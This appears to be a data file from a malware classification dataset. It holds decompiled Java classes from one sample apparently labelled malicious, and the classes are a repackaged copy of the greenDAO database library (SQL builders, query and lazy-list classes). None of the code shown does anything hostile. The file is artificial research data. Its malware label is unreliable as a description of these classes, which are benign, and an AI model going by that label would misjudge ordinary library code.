"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.internal\SqlUtils.code","public class SqlUtils {   public static StringBuilder appendColumn(  StringBuilder sb,  String str){     sb.append('\'').append(str).append('\'');     return sb;   }   public static StringBuilder appendColumn(  StringBuilder sb,  String str,  String str2){     sb.append(str).append("".'"").append(str2).append('\'');     return sb;   }   public static StringBuilder appendColumns(  StringBuilder sb,  String str,  String[] strArr){     int length=strArr.length;     for (int i=0; i < length; i++) {       appendColumn(sb,str,strArr[i]);       if (i < length - 1) {         sb.append(',');       }     }     return sb;   }   public static StringBuilder appendColumns(  StringBuilder sb,  String[] strArr){     int length=strArr.length;     for (int i=0; i < length; i++) {       sb.append('\'').append(strArr[i]).append('\'');       if (i < length - 1) {         sb.append(',');       }     }     return sb;   }   public static StringBuilder appendColumnsEqValue(  StringBuilder sb,  String str,  String[] strArr){     for (int i=0; i < strArr.length; i++) {       appendColumn(sb,str,strArr[i]).append(""=?"");       if (i < strArr.length - 1) {         sb.append(',');       }     }     return sb;   }   public static StringBuilder appendColumnsEqualPlaceholders(  StringBuilder sb,  String[] strArr){     for (int i=0; i < strArr.length; i++) {       appendColumn(sb,strArr[i]).append(""=?"");       if (i < strArr.length - 1) {         sb.append(',');       }     }     return sb;   }   public static StringBuilder appendPlaceholders(  StringBuilder sb,  int i){     for (int i2=0; i2 < i; i2++) {       if (i2 < i - 1) {         sb.append(""?,"");       }  else {         sb.append('?');       }     }     return sb;   }   public static String createSqlDelete(  String str,  String[] strArr){     StringBuilder sb=new StringBuilder(""DELETE FROM "");     sb.append(str);     if (strArr != null && strArr.length > 0) {       sb.append("" WHERE "");       appendColumnsEqValue(sb,str,strArr);     }     return sb.toString();   }   public static String createSqlInsert(  String str,  String str2,  String[] strArr){     StringBuilder sb=new StringBuilder(str);     sb.append(str2).append("" ("");     appendColumns(sb,strArr);     sb.append("") VALUES ("");     appendPlaceholders(sb,strArr.length);     sb.append(')');     return sb.toString();   }   public static String createSqlSelect(  String str,  String str2,  String[] strArr){     StringBuilder sb=new StringBuilder(""SELECT "");     if (str2 == null || str2.length() < 0) {       throw new DaoException(""Table alias required"");     }     appendColumns(sb,str2,strArr).append("" FROM "");     sb.append(str).append(' ').append(str2).append(' ');     return sb.toString();   }   public static String createSqlSelectCountStar(  String str,  String str2){     StringBuilder sb=new StringBuilder(""SELECT COUNT(*) FROM "");     sb.append(str).append(' ');     if (str2 != null) {       sb.append(str2).append(' ');     }     return sb.toString();   }   public static String createSqlUpdate(  String str,  String[] strArr,  String[] strArr2){     StringBuilder sb=new StringBuilder(""UPDATE "");     sb.append(str).append("" SET "");     appendColumnsEqualPlaceholders(sb,strArr);     sb.append("" WHERE "");     appendColumnsEqValue(sb,str,strArr2);     return sb.toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.internal\TableStatements.code","public class TableStatements {   private final String[] allColumns;   private final SQLiteDatabase db;   private SQLiteStatement deleteStatement;   private SQLiteStatement insertOrReplaceStatement;   private SQLiteStatement insertStatement;   private final String[] pkColumns;   private volatile String selectAll;   private volatile String selectByKey;   private volatile String selectByRowId;   private volatile String selectKeys;   private final String tablename;   private SQLiteStatement updateStatement;   public TableStatements(  SQLiteDatabase sQLiteDatabase,  String str,  String[] strArr,  String[] strArr2){     this.db=sQLiteDatabase;     this.tablename=str;     this.allColumns=strArr;     this.pkColumns=strArr2;   }   public SQLiteStatement getDeleteStatement(){     if (this.deleteStatement == null) {       this.deleteStatement=this.db.compileStatement(SqlUtils.createSqlDelete(this.tablename,this.pkColumns));     }     return this.deleteStatement;   }   public SQLiteStatement getInsertOrReplaceStatement(){     if (this.insertOrReplaceStatement == null) {       this.insertOrReplaceStatement=this.db.compileStatement(SqlUtils.createSqlInsert(""INSERT OR REPLACE INTO "",this.tablename,this.allColumns));     }     return this.insertOrReplaceStatement;   }   public SQLiteStatement getInsertStatement(){     if (this.insertStatement == null) {       this.insertStatement=this.db.compileStatement(SqlUtils.createSqlInsert(""INSERT INTO "",this.tablename,this.allColumns));     }     return this.insertStatement;   }   public String getSelectAll(){     if (this.selectAll == null) {       this.selectAll=SqlUtils.createSqlSelect(this.tablename,""T"",this.allColumns);     }     return this.selectAll;   }   public String getSelectByKey(){     if (this.selectByKey == null) {       StringBuilder sb=new StringBuilder(getSelectAll());       sb.append(""WHERE "");       SqlUtils.appendColumnsEqValue(sb,""T"",this.pkColumns);       this.selectByKey=sb.toString();     }     return this.selectByKey;   }   public String getSelectByRowId(){     if (this.selectByRowId == null) {       this.selectByRowId=getSelectAll() + ""WHERE ROWID=?"";     }     return this.selectByRowId;   }   public String getSelectKeys(){     if (this.selectKeys == null) {       this.selectKeys=SqlUtils.createSqlSelect(this.tablename,""T"",this.pkColumns);     }     return this.selectKeys;   }   public SQLiteStatement getUpdateStatement(){     if (this.updateStatement == null) {       this.updateStatement=this.db.compileStatement(SqlUtils.createSqlUpdate(this.tablename,this.allColumns,this.pkColumns));     }     return this.updateStatement;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\AbstractCondition.code","public abstract class AbstractCondition implements WhereCondition {   protected final boolean hasSingleValue;   protected final Object value;   protected final Object[] values;   public AbstractCondition(){     this.hasSingleValue=false;     this.value=null;     this.values=null;   }   public AbstractCondition(  Object obj){     this.value=obj;     this.hasSingleValue=true;     this.values=null;   }   public AbstractCondition(  Object[] objArr){     this.value=null;     this.hasSingleValue=false;     this.values=objArr;   }   @Override public void appendValuesTo(  List<Object> list){     if (this.hasSingleValue) {       list.add(this.value);     }     if (this.values != null) {       for (      Object obj : this.values) {         list.add(obj);       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\AbstractQuery.code","public abstract class AbstractQuery<T> {   protected final AbstractDao<T,?> dao;   protected final InternalQueryDaoAccess<T> daoAccess;   protected final Thread ownerThread=Thread.currentThread();   protected final String[] parameters;   protected final String sql;   public AbstractQuery(  AbstractDao<T,?> abstractDao,  String str,  String[] strArr){     this.dao=abstractDao;     this.daoAccess=new InternalQueryDaoAccess<>(abstractDao);     this.sql=str;     this.parameters=strArr;   }   public static String[] toStringArray(  Object[] objArr){     int length=objArr.length;     String[] strArr=new String[length];     for (int i=0; i < length; i++) {       Object obj=objArr[i];       if (obj != null) {         strArr[i]=obj.toString();       }  else {         strArr[i]=null;       }     }     return strArr;   }   public void checkThread(){     if (Thread.currentThread() != this.ownerThread) {       throw new DaoException(""Method may be called only in owner thread, use forCurrentThread to get an instance for this thread"");     }   }   public void setParameter(  int i,  Object obj){     checkThread();     if (obj != null) {       this.parameters[i]=obj.toString();     }  else {       this.parameters[i]=null;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\AbstractQueryData.code","public abstract class AbstractQueryData<T,Q extends AbstractQuery<T>> {   final AbstractDao<T,?> dao;   final String[] initialValues;   final SparseArray<WeakReference<Q>> queriesForThreads=new SparseArray<>();   final String sql;   public AbstractQueryData(  AbstractDao<T,?> abstractDao,  String str,  String[] strArr){     this.dao=abstractDao;     this.sql=str;     this.initialValues=strArr;   }   protected abstract Q createQuery();   public Q forCurrentThread(){     Q q;     int myTid=Process.myTid(); synchronized (this.queriesForThreads) {       WeakReference<Q> weakReference=this.queriesForThreads.get(myTid);       q=weakReference != null ? weakReference.get() : null;       if (q == null) {         gc();         q=createQuery();         this.queriesForThreads.put(myTid,new WeakReference<>(q));       }  else {         System.arraycopy(this.initialValues,0,q.parameters,0,this.initialValues.length);       }     }     return q;   }   public Q forCurrentThread(  Q q){     if (Thread.currentThread() != q.ownerThread) {       return forCurrentThread();     }     System.arraycopy(this.initialValues,0,q.parameters,0,this.initialValues.length);     return q;   }   void gc(){ synchronized (this.queriesForThreads) {       for (int size=this.queriesForThreads.size() - 1; size >= 0; size--) {         if (this.queriesForThreads.valueAt(size).get() == null) {           this.queriesForThreads.remove(this.queriesForThreads.keyAt(size));         }       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\CloseableListIterator.code","public interface CloseableListIterator<T> extends Closeable, ListIterator<T> { } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\CountQuery.code","public class CountQuery<T> extends AbstractQuery<T> {   private final QueryData<T> queryData; public final class QueryData<T2> extends AbstractQueryData<T2,CountQuery<T2>> {     private QueryData(    AbstractDao<T2,?> abstractDao,    String str,    String[] strArr){       super(abstractDao,str,strArr);     }     @Override public CountQuery<T2> createQuery(){       return new CountQuery<>(this,this.dao,this.sql,(String[])this.initialValues.clone());     }   }   private CountQuery(  QueryData<T> queryData,  AbstractDao<T,?> abstractDao,  String str,  String[] strArr){     super(abstractDao,str,strArr);     this.queryData=queryData;   }   public static <T2>CountQuery<T2> create(  AbstractDao<T2,?> abstractDao,  String str,  Object[] objArr){     return new QueryData(abstractDao,str,toStringArray(objArr)).forCurrentThread();   }   public long count(){     checkThread();     Cursor rawQuery=this.dao.getDatabase().rawQuery(this.sql,this.parameters);     try {       if (!rawQuery.moveToNext()) {         throw new DaoException(""No result for count"");       }       if (!rawQuery.isLast()) {         throw new DaoException(""Unexpected row count: "" + rawQuery.getCount());       }       if (rawQuery.getColumnCount() != 1) {         throw new DaoException(""Unexpected column count: "" + rawQuery.getColumnCount());       }       return rawQuery.getLong(0);     }   finally {       rawQuery.close();     }   }   public CountQuery<T> forCurrentThread(){     return (CountQuery)this.queryData.forCurrentThread(this);   }   @Override public void setParameter(  int i,  Object obj){     super.setParameter(i,obj);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\DeleteQuery.code","public class DeleteQuery<T> extends AbstractQuery<T> {   private final QueryData<T> queryData; public final class QueryData<T2> extends AbstractQueryData<T2,DeleteQuery<T2>> {     private QueryData(    AbstractDao<T2,?> abstractDao,    String str,    String[] strArr){       super(abstractDao,str,strArr);     }     @Override public DeleteQuery<T2> createQuery(){       return new DeleteQuery<>(this,this.dao,this.sql,(String[])this.initialValues.clone());     }   }   private DeleteQuery(  QueryData<T> queryData,  AbstractDao<T,?> abstractDao,  String str,  String[] strArr){     super(abstractDao,str,strArr);     this.queryData=queryData;   }   public static <T2>DeleteQuery<T2> create(  AbstractDao<T2,?> abstractDao,  String str,  Object[] objArr){     return new QueryData(abstractDao,str,toStringArray(objArr)).forCurrentThread();   }   public void executeDeleteWithoutDetachingEntities(){     checkThread();     SQLiteDatabase database=this.dao.getDatabase();     if (database.isDbLockedByCurrentThread()) {       this.dao.getDatabase().execSQL(this.sql,this.parameters);       return;     }     database.beginTransaction();     try {       this.dao.getDatabase().execSQL(this.sql,this.parameters);       database.setTransactionSuccessful();     }   finally {       database.endTransaction();     }   }   public DeleteQuery<T> forCurrentThread(){     return (DeleteQuery)this.queryData.forCurrentThread(this);   }   @Override public void setParameter(  int i,  Object obj){     super.setParameter(i,obj);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\LazyIterator.code","public class LazyIterator implements CloseableListIterator<E> {   private final boolean closeWhenDone;   private int index;   public LazyIterator(  int i,  boolean z){     this.index=i;     this.closeWhenDone=z;   }   @Override public void add(  E e){     throw new UnsupportedOperationException();   }   @Override public void close(){     LazyList.this.close();   }   @Override public boolean hasNext(){     return this.index < LazyList.this.size;   }   @Override public boolean hasPrevious(){     return this.index > 0;   }   @Override public E next(){     if (this.index >= LazyList.this.size) {       throw new NoSuchElementException();     }     E e=(E)LazyList.this.get(this.index);     this.index++;     if (this.index == LazyList.this.size && this.closeWhenDone) {       close();     }     return e;   }   @Override public int nextIndex(){     return this.index;   }   @Override public E previous(){     if (this.index <= 0) {       throw new NoSuchElementException();     }     this.index--;     return (E)LazyList.this.get(this.index);   }   @Override public int previousIndex(){     return this.index - 1;   }   @Override public void remove(){     throw new UnsupportedOperationException();   }   @Override public void set(  E e){     throw new UnsupportedOperationException();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\LazyList.code","public class LazyList<E> implements Closeable, List<E> {   private final Cursor cursor;   private final InternalQueryDaoAccess<E> daoAccess;   private final List<E> entities;   private volatile int loadedCount;   private final ReentrantLock lock;   private final int size; public class LazyIterator implements CloseableListIterator<E> {     private final boolean closeWhenDone;     private int index;     public LazyIterator(    int i,    boolean z){       this.index=i;       this.closeWhenDone=z;     }     @Override public void add(    E e){       throw new UnsupportedOperationException();     }     @Override public void close(){       LazyList.this.close();     }     @Override public boolean hasNext(){       return this.index < LazyList.this.size;     }     @Override public boolean hasPrevious(){       return this.index > 0;     }     @Override public E next(){       if (this.index >= LazyList.this.size) {         throw new NoSuchElementException();       }       E e=(E)LazyList.this.get(this.index);       this.index++;       if (this.index == LazyList.this.size && this.closeWhenDone) {         close();       }       return e;     }     @Override public int nextIndex(){       return this.index;     }     @Override public E previous(){       if (this.index <= 0) {         throw new NoSuchElementException();       }       this.index--;       return (E)LazyList.this.get(this.index);     }     @Override public int previousIndex(){       return this.index - 1;     }     @Override public void remove(){       throw new UnsupportedOperationException();     }     @Override public void set(    E e){       throw new UnsupportedOperationException();     }   }   public LazyList(  InternalQueryDaoAccess<E> internalQueryDaoAccess,  Cursor cursor,  boolean z){     this.cursor=cursor;     this.daoAccess=internalQueryDaoAccess;     this.size=cursor.getCount();     if (z) {       this.entities=new ArrayList(this.size);       for (int i=0; i < this.size; i++) {         this.entities.add(null);       }     }  else {       this.entities=null;     }     if (this.size == 0) {       cursor.close();     }     this.lock=new ReentrantLock();   }   @Override public void add(  int i,  E e){     throw new UnsupportedOperationException();   }   @Override public boolean add(  E e){     throw new UnsupportedOperationException();   }   @Override public boolean addAll(  int i,  Collection<? extends E> collection){     throw new UnsupportedOperationException();   }   @Override public boolean addAll(  Collection<? extends E> collection){     throw new UnsupportedOperationException();   }   protected void checkCached(){     if (this.entities == null) {       throw new DaoException(""This operation only works with cached lazy lists"");     }   }   @Override public void clear(){     throw new UnsupportedOperationException();   }   @Override public void close(){     this.cursor.close();   }   @Override public boolean contains(  Object obj){     loadRemaining();     return this.entities.contains(obj);   }   @Override public boolean containsAll(  Collection<?> collection){     loadRemaining();     return this.entities.containsAll(collection);   }   @Override public E get(  int i){     if (this.entities == null) {       return loadEntity(i);     }     E e=this.entities.get(i);     if (e != null) {       return e;     }     this.lock.lock();     try {       E e2=this.entities.get(i);       if (e2 == null) {         e2=loadEntity(i);         this.entities.set(i,e2);         this.loadedCount++;         if (this.loadedCount == this.size) {           this.cursor.close();         }       }       return e2;     }   finally {       this.lock.unlock();     }   }   public int getLoadedCount(){     return this.loadedCount;   }   @Override public int indexOf(  Object obj){     loadRemaining();     return this.entities.indexOf(obj);   }   public boolean isClosed(){     return this.cursor.isClosed();   }   @Override public boolean isEmpty(){     return this.size == 0;   }   public boolean isLoadedCompletely(){     return this.loadedCount == this.size;   }   @Override public Iterator<E> iterator(){     return new LazyIterator(0,false);   }   @Override public int lastIndexOf(  Object obj){     loadRemaining();     return this.entities.lastIndexOf(obj);   }   @Override public CloseableListIterator<E> listIterator(){     return new LazyIterator(0,false);   }   @Override public ListIterator<E> listIterator(  int i){     return new LazyIterator(i,false);   }   public CloseableListIterator<E> listIteratorAutoClose(){     return new LazyIterator(0,true);   }   protected E loadEntity(  int i){     this.cursor.moveToPosition(i);     E loadCurrent=this.daoAccess.loadCurrent(this.cursor,0,true);     if (loadCurrent == null) {       throw new DaoException(""Loading of entity failed (null) at position "" + i);     }     return loadCurrent;   }   public void loadRemaining(){     checkCached();     int size=this.entities.size();     for (int i=0; i < size; i++) {       get(i);     }   }   public E peak(  int i){     if (this.entities != null) {       return this.entities.get(i);     }     return null;   }   @Override public E remove(  int i){     throw new UnsupportedOperationException();   }   @Override public boolean remove(  Object obj){     throw new UnsupportedOperationException();   }   @Override public boolean removeAll(  Collection<?> collection){     throw new UnsupportedOperationException();   }   @Override public boolean retainAll(  Collection<?> collection){     throw new UnsupportedOperationException();   }   @Override public E set(  int i,  E e){     throw new UnsupportedOperationException();   }   @Override public int size(){     return this.size;   }   @Override public List<E> subList(  int i,  int i2){     checkCached();     for (int i3=i; i3 < i2; i3++) {       this.entities.get(i3);     }     return this.entities.subList(i,i2);   }   @Override public Object[] toArray(){     loadRemaining();     return this.entities.toArray();   }   @Override public <T>T[] toArray(  T[] tArr){     loadRemaining();     return (T[])this.entities.toArray(tArr);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\PropertyCondition.code","public class PropertyCondition extends AbstractCondition {   public final String op;   public final Property property;   public PropertyCondition(  Property property,  String str){     this.property=property;     this.op=str;   }   public PropertyCondition(  Property property,  String str,  Object obj){     super(checkValueForType(property,obj));     this.property=property;     this.op=str;   }   public PropertyCondition(  Property property,  String str,  Object[] objArr){     super(checkValuesForType(property,objArr));     this.property=property;     this.op=str;   }   private static Object checkValueForType(  Property property,  Object obj){     if (obj != null && obj.getClass().isArray()) {       throw new DaoException(""Illegal value: found array, but simple object required"");     }     if (property.type == Date.class) {       if (obj instanceof Date) {         return Long.valueOf(((Date)obj).getTime());       }       if (obj instanceof Long) {         return obj;       }       throw new DaoException(""Illegal date value: expected java.util.Date or Long for value "" + obj);     }     if (property.type != Boolean.TYPE && property.type != Boolean.class) {       return obj;     }     if (obj instanceof Boolean) {       return Integer.valueOf(((Boolean)obj).booleanValue() ? 1 : 0);     }     if (obj instanceof Number) {       int intValue=((Number)obj).intValue();       if (intValue == 0 || intValue == 1) {         return obj;       }       throw new DaoException(""Illegal boolean value: numbers must be 0 or 1, but was "" + obj);     }     if (!(obj instanceof String)) {       return obj;     }     String str=(String)obj;     if (""TRUE"".equalsIgnoreCase(str)) {       return 1;     }     if (""FALSE"".equalsIgnoreCase(str)) {       return 0;     }     throw new DaoException(""Illegal boolean value: Strings must be \""TRUE\"" or \""FALSE\"" (case insesnsitive), but was "" + obj);   }   private static Object[] checkValuesForType(  Property property,  Object[] objArr){     for (int i=0; i < objArr.length; i++) {       objArr[i]=checkValueForType(property,objArr[i]);     }     return objArr;   }   @Override public void appendTo(  StringBuilder sb,  String str){     if (str != null) {       sb.append(str).append('.');     }     sb.append('\'').append(this.property.columnName).append('\'').append(this.op);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\Query.code","public class Query<T> extends AbstractQuery<T> {   private final int limitPosition;   private final int offsetPosition;   private final QueryData<T> queryData; public final class QueryData<T2> extends AbstractQueryData<T2,Query<T2>> {     private final int limitPosition;     private final int offsetPosition;     QueryData(    AbstractDao<T2,?> abstractDao,    String str,    String[] strArr,    int i,    int i2){       super(abstractDao,str,strArr);       this.limitPosition=i;       this.offsetPosition=i2;     }     @Override public Query<T2> createQuery(){       return new Query<>(this,this.dao,this.sql,(String[])this.initialValues.clone(),this.limitPosition,this.offsetPosition);     }   }   private Query(  QueryData<T> queryData,  AbstractDao<T,?> abstractDao,  String str,  String[] strArr,  int i,  int i2){     super(abstractDao,str,strArr);     this.queryData=queryData;     this.limitPosition=i;     this.offsetPosition=i2;   }   public static <T2>Query<T2> create(  AbstractDao<T2,?> abstractDao,  String str,  Object[] objArr,  int i,  int i2){     return new QueryData(abstractDao,str,toStringArray(objArr),i,i2).forCurrentThread();   }   public static <T2>Query<T2> internalCreate(  AbstractDao<T2,?> abstractDao,  String str,  Object[] objArr){     return create(abstractDao,str,objArr,-1,-1);   }   public Query<T> forCurrentThread(){     return (Query)this.queryData.forCurrentThread(this);   }   public List<T> list(){     checkThread();     return this.daoAccess.loadAllAndCloseCursor(this.dao.getDatabase().rawQuery(this.sql,this.parameters));   }   public CloseableListIterator<T> listIterator(){     return listLazyUncached().listIteratorAutoClose();   }   public LazyList<T> listLazy(){     checkThread();     return new LazyList<>(this.daoAccess,this.dao.getDatabase().rawQuery(this.sql,this.parameters),true);   }   public LazyList<T> listLazyUncached(){     checkThread();     return new LazyList<>(this.daoAccess,this.dao.getDatabase().rawQuery(this.sql,this.parameters),false);   }   public void setLimit(  int i){     checkThread();     if (this.limitPosition == -1) {       throw new IllegalStateException(""Limit must be set with QueryBuilder before it can be used here"");     }     this.parameters[this.limitPosition]=Integer.toString(i);   }   public void setOffset(  int i){     checkThread();     if (this.offsetPosition == -1) {       throw new IllegalStateException(""Offset must be set with QueryBuilder before it can be used here"");     }     this.parameters[this.offsetPosition]=Integer.toString(i);   }   @Override public void setParameter(  int i,  Object obj){     if (i >= 0 && (i == this.limitPosition || i == this.offsetPosition)) {       throw new IllegalArgumentException(""Illegal parameter index: "" + i);     }     super.setParameter(i,obj);   }   public T unique(){     checkThread();     return this.daoAccess.loadUniqueAndCloseCursor(this.dao.getDatabase().rawQuery(this.sql,this.parameters));   }   public T uniqueOrThrow(){     T unique=unique();     if (unique == null) {       throw new DaoException(""No entity found for query"");     }     return unique;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\QueryBuilder.code","public class QueryBuilder<T> {   public static boolean LOG_SQL;   public static boolean LOG_VALUES;   private final AbstractDao<T,?> dao;   private StringBuilder joinBuilder;   private Integer limit;   private Integer offset;   private StringBuilder orderBuilder;   private final String tablePrefix;   private final List<Object> values;   private final List<WhereCondition> whereConditions;   protected QueryBuilder(  AbstractDao<T,?> abstractDao){     this(abstractDao,""T"");   }   protected QueryBuilder(  AbstractDao<T,?> abstractDao,  String str){     this.dao=abstractDao;     this.tablePrefix=str;     this.values=new ArrayList();     this.whereConditions=new ArrayList();   }   private void appendWhereClause(  StringBuilder sb,  String str){     this.values.clear();     if (this.whereConditions.isEmpty()) {       return;     }     sb.append("" WHERE "");     ListIterator<WhereCondition> listIterator=this.whereConditions.listIterator();     while (listIterator.hasNext()) {       if (listIterator.hasPrevious()) {         sb.append("" AND "");       }       WhereCondition next=listIterator.next();       next.appendTo(sb,str);       next.appendValuesTo(this.values);     }   }   private void checkOrderBuilder(){     if (this.orderBuilder == null) {       this.orderBuilder=new StringBuilder();     }  else     if (this.orderBuilder.length() > 0) {       this.orderBuilder.append("","");     }   }   public static <T2>QueryBuilder<T2> internalCreate(  AbstractDao<T2,?> abstractDao){     return new QueryBuilder<>(abstractDao);   }   private void orderAscOrDesc(  String str,  Property... propertyArr){     for (    Property property : propertyArr) {       checkOrderBuilder();       append(this.orderBuilder,property);       if (String.class.equals(property.type)) {         this.orderBuilder.append("" COLLATE LOCALIZED"");       }       this.orderBuilder.append(str);     }   }   protected void addCondition(  StringBuilder sb,  List<Object> list,  WhereCondition whereCondition){     checkCondition(whereCondition);     whereCondition.appendTo(sb,this.tablePrefix);     whereCondition.appendValuesTo(list);   }   public WhereCondition and(  WhereCondition whereCondition,  WhereCondition whereCondition2,  WhereCondition... whereConditionArr){     return combineWhereConditions("" AND "",whereCondition,whereCondition2,whereConditionArr);   }   protected StringBuilder append(  StringBuilder sb,  Property property){     checkProperty(property);     sb.append(this.tablePrefix).append('.').append('\'').append(property.columnName).append('\'');     return sb;   }   public Query<T> build(){     int i;     int i2=-1;     StringBuilder sb=new StringBuilder((this.joinBuilder == null || this.joinBuilder.length() == 0) ? InternalQueryDaoAccess.getStatements(this.dao).getSelectAll() : SqlUtils.createSqlSelect(this.dao.getTablename(),this.tablePrefix,this.dao.getAllColumns()));     appendWhereClause(sb,this.tablePrefix);     if (this.orderBuilder != null && this.orderBuilder.length() > 0) {       sb.append("" ORDER BY "").append((CharSequence)this.orderBuilder);     }     if (this.limit != null) {       sb.append("" LIMIT ?"");       this.values.add(this.limit);       i=this.values.size() - 1;     }  else {       i=-1;     }     if (this.offset != null) {       if (this.limit == null) {         throw new IllegalStateException(""Offset cannot be set without limit"");       }       sb.append("" OFFSET ?"");       this.values.add(this.offset);       i2=this.values.size() - 1;     }     String sb2=sb.toString();     if (LOG_SQL) {       DaoLog.d(""Built SQL for query: "" + sb2);     }     if (LOG_VALUES) {       DaoLog.d(""Values for query: "" + this.values);     }     return Query.create(this.dao,sb2,this.values.toArray(),i,i2);   }   public CountQuery<T> buildCount(){     StringBuilder sb=new StringBuilder(SqlUtils.createSqlSelectCountStar(this.dao.getTablename(),this.tablePrefix));     appendWhereClause(sb,this.tablePrefix);     String sb2=sb.toString();     if (LOG_SQL) {       DaoLog.d(""Built SQL for count query: "" + sb2);     }     if (LOG_VALUES) {       DaoLog.d(""Values for count query: "" + this.values);     }     return CountQuery.create(this.dao,sb2,this.values.toArray());   }   public DeleteQuery<T> buildDelete(){     String tablename=this.dao.getTablename();     StringBuilder sb=new StringBuilder(SqlUtils.createSqlDelete(tablename,null));     appendWhereClause(sb,this.tablePrefix);     String replace=sb.toString().replace(this.tablePrefix + "".'"",tablename + "".'"");     if (LOG_SQL) {       DaoLog.d(""Built SQL for delete query: "" + replace);     }     if (LOG_VALUES) {       DaoLog.d(""Values for delete query: "" + this.values);     }     return DeleteQuery.create(this.dao,replace,this.values.toArray());   }   protected void checkCondition(  WhereCondition whereCondition){     if (whereCondition instanceof WhereCondition.PropertyCondition) {       checkProperty(((WhereCondition.PropertyCondition)whereCondition).property);     }   }   protected void checkProperty(  Property property){     boolean z=false;     if (this.dao != null) {       Property[] properties=this.dao.getProperties();       int length=properties.length;       int i=0;       while (true) {         if (i >= length) {           break;         }         if (property == properties[i]) {           z=true;           break;         }         i++;       }       if (!z) {         throw new DaoException(""Property '"" + property.name + ""' is not part of ""+ this.dao);       }     }   }   protected WhereCondition combineWhereConditions(  String str,  WhereCondition whereCondition,  WhereCondition whereCondition2,  WhereCondition... whereConditionArr){     StringBuilder sb=new StringBuilder(""("");     ArrayList arrayList=new ArrayList();     addCondition(sb,arrayList,whereCondition);     sb.append(str);     addCondition(sb,arrayList,whereCondition2);     for (    WhereCondition whereCondition3 : whereConditionArr) {       sb.append(str);       addCondition(sb,arrayList,whereCondition3);     }     sb.append(')');     return new WhereCondition.StringCondition(sb.toString(),arrayList.toArray());   }   public long count(){     return buildCount().count();   }   public <J>QueryBuilder<J> join(  Class<J> cls,  Property property){     throw new UnsupportedOperationException();   }   public <J>QueryBuilder<J> joinToMany(  Class<J> cls,  Property property){     throw new UnsupportedOperationException();   }   public QueryBuilder<T> limit(  int i){     this.limit=Integer.valueOf(i);     return this;   }   public List<T> list(){     return build().list();   }   public CloseableListIterator<T> listIterator(){     return build().listIterator();   }   public LazyList<T> listLazy(){     return build().listLazy();   }   public LazyList<T> listLazyUncached(){     return build().listLazyUncached();   }   public QueryBuilder<T> offset(  int i){     this.offset=Integer.valueOf(i);     return this;   }   public WhereCondition or(  WhereCondition whereCondition,  WhereCondition whereCondition2,  WhereCondition... whereConditionArr){     return combineWhereConditions("" OR "",whereCondition,whereCondition2,whereConditionArr);   }   public QueryBuilder<T> orderAsc(  Property... propertyArr){     orderAscOrDesc("" ASC"",propertyArr);     return this;   }   public QueryBuilder<T> orderCustom(  Property property,  String str){     checkOrderBuilder();     append(this.orderBuilder,property).append(' ');     this.orderBuilder.append(str);     return this;   }   public QueryBuilder<T> orderDesc(  Property... propertyArr){     orderAscOrDesc("" DESC"",propertyArr);     return this;   }   public QueryBuilder<T> orderRaw(  String str){     checkOrderBuilder();     this.orderBuilder.append(str);     return this;   }   public T unique(){     return build().unique();   }   public T uniqueOrThrow(){     return build().uniqueOrThrow();   }   public QueryBuilder<T> where(  WhereCondition whereCondition,  WhereCondition... whereConditionArr){     this.whereConditions.add(whereCondition);     for (    WhereCondition whereCondition2 : whereConditionArr) {       checkCondition(whereCondition2);       this.whereConditions.add(whereCondition2);     }     return this;   }   public QueryBuilder<T> whereOr(  WhereCondition whereCondition,  WhereCondition whereCondition2,  WhereCondition... whereConditionArr){     this.whereConditions.add(or(whereCondition,whereCondition2,whereConditionArr));     return this;   } } "
